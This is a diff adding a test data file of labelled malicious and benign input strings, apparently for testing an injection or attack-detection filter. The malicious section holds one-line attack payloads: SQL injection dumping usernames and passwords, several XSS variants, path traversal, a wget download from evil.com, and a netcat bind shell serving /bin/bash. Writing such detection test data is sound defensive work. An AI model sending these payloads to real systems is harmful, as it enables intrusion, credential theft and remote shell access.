@@ -1,0 +1,24 @@
+# test_payloads.txt
+
+# --- Malicious Samples ---
+1' UNION ALL SELECT NULL, CONCAT(user, 0x3a, password), NULL FROM users--
+<body onload=alert('xss')>
+../../../../../../windows/system32/drivers/etc/hosts
+&& wget http://evil.com/shell.sh
+eval(String.fromCharCode(97,108,101,114,116,40,49,41))
+%3Csvg%2Fonload%3Dalert(1)%3E
+| nc -l -p 4444 -e /bin/bash
+EXEC sp_configure 'show advanced options', 1;
+
+# --- Benign Samples ---
+I need to write a SQL query like 'SELECT * FROM users WHERE id > 105'.
+The error is in the line with "<div class='main'>". Check the HTML.
+/search?q=what is a 'union' in sql?
+https://api.github.com/repos/tensorflow/tensorflow/issues?state=open&labels=bug
+{"user": {"name": "Alex", "permissions": ["read", "write"]}}
+My script is called 'test-script.sh'.
+update-grub
+GET /static/css/main.css HTTP/1.1
+
+
+
